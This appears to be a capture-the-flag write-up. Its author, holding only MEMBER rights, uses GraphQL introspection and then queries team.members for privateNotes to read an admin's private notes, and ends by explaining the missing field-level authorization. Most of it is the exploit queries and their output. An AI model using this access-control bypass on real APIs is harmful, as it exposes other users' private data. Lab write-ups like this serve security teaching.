I started by checking what I could get from `me`:

```graphql
query {
  me {
    id
    username
    role
    privateNotes
    team {
      id
      name
      members {
        username
        role
      }
    }
  }
}
```

I got:

```text
username: researcher_417
role: MEMBER
id: user_417
```

The interesting part was the team:

```text
researcher_417 - MEMBER
admin_417      - ADMIN
```

So I wanted to see what the GraphQL API actually exposed. I used introspection and found that `User` had these fields:

```text
id
username
role
team
privateNotes
```

`privateNotes` stood out because I'm only a `MEMBER`, but the API lets me request it.

I also found this on `Query`:

```graphql
user(id: ID!)
```

I tried:

```graphql
query {
  user(id: "admin_417") {
    id
    username
    role
    privateNotes
  }
}
```

It returned:

```json
"user": null
```

So `admin_417` wasn't working there.

I went back to `team.members` and added the `id` field:
query {
  me {
    team {
      members {
        id
        username
        role
      }
    }
  }
}

This returned:

researcher_417 - user_417
admin_417 - admin_417

Now I knew the admin's ID.

The next thing I tried was adding `privateNotes` to the members query:
query {
  me {
    team {
      members {
        id
        username
        role
        privateNotes
      }
    }
  }
}

That worked, and I got the admin's private notes:

text
POCTF{redacted}


So the problem was that I could access the User object for the admin through team.members, and the API didn't stop me from requesting the privateNotes field even though I was only a MEMBER.
